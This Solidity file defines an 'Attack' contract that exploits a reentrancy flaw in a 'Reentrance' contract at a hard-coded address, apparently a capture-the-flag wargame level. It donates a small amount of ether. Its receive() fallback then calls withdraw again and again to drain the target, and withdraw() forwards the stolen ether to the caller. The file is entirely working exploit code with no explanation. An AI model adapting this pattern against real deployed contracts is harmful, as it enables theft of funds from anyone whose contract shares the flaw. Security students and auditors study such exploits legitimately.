// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import { Reentrance } from  "./renter.sol";

contract Attack {
    Reentrance public reentranceInstance = Reentrance(payable(0xD83C102DE905eC96D46ff8036b89F9205511f1b4));
    
    constructor() public payable {
        reentranceInstance.donate{value:0.00001 ether}(address(this));
    }

    function withdraw() external {
        reentranceInstance.withdraw(0.00001 ether);
        (bool result,) = msg.sender.call{value:0.00002 ether}("");
        require(result);
    }

    receive() external payable {
        reentranceInstance.withdraw(0.00001 ether);
    }
}